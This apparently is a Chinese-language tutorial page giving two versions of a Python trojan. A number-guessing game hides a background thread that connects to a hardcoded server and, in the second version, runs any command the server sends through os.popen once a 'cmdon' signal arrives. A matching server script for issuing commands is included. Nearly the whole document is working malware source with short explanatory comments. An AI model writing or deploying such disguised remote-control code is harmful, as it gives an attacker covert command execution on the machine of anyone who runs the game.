#### 第一版测试
```python
#client.py
import random
import socket
import threading


def trojan():
    host = '192.168.107.15'    #trojan's server ip address
    port = 9999

    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((host,port))

    while True:
        server_cmd = client.recv(1024).decode('utf-8')
        if server_cmd == 'hello':
            print("hello world")
        client.send(f"{server_cmd} was executed successfully!".encode('utf-8')) #f""是f.format()的简化版

def game():
    number = random.randint(0,1000)
    tries = 1
    done = False

    while not done:
        guess = int(input("Please enter a number:"))

        if guess == number:
            done = True
            print("You won")
        else:
            tries += 1
            if guess > number:
                print("The actual number is smaller!")
            else:
                print("The actual number is larger!")
    print(f"You needed {tries} tries!")

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()


#server.py
import socket

host = '0.0.0.0'
port = 9999

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))

s.listen()
client,address = s.accept()

while True:
    print(f"Connected to {address}")
    cmd_input = input("Enter a command:")
    client.send(cmd_input.encode('utf-8'))
    print(client.recv(1024).decode('utf-8'))



#在服务器端输入hello,客户端会打印hello world
```

#### 第二版正式版
```python
#client.py
import random
import socket
import threading
import os

def trojan():
    host = '192.168.107.15'    #trojan's server ip address
    port = 9999

    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((host,port))

    cmd_flag = False #配置命令行开启标记位



    while True:
        server_cmd = client.recv(1024).decode('utf-8')
        if server_cmd == 'cmdon':    #开启命令行
            cmd_flag = True
            client.send("You now have terminal access!".encode('utf-8'))
            continue
        if server_cmd == 'cmdoff':   #关闭命令行
            cmd_flag = False
        if cmd_flag:
            os.popen(server_cmd)   #os.popen() 方法用于从一个命令打开一个管道。在Unix，Windows中有效,可以执行系统命令
        else:
            if server_cmd == 'hello':
                print("hello world")
        client.send(f"{server_cmd} was executed successfully!".encode('utf-8'))

def game():
    number = random.randint(0,1000)
    tries = 1
    done = False

    while not done:
        guess = int(input("Please enter a number:"))

        if guess == number:
            done = True
            print("You won")
        else:
            tries += 1
            if guess > number:
                print("The actual number is smaller!")
            else:
                print("The actual number is larger!")
    print(f"You needed {tries} tries!")

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()

#server.py
import socket

host = '0.0.0.0'
port = 9999

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))

s.listen()
client,address = s.accept()

while True:
    print(f"Connected to {address}")
    cmd_input = input("Enter a command:")
    client.send(cmd_input.encode('utf-8'))
    print(client.recv(1024).decode('utf-8'))
```
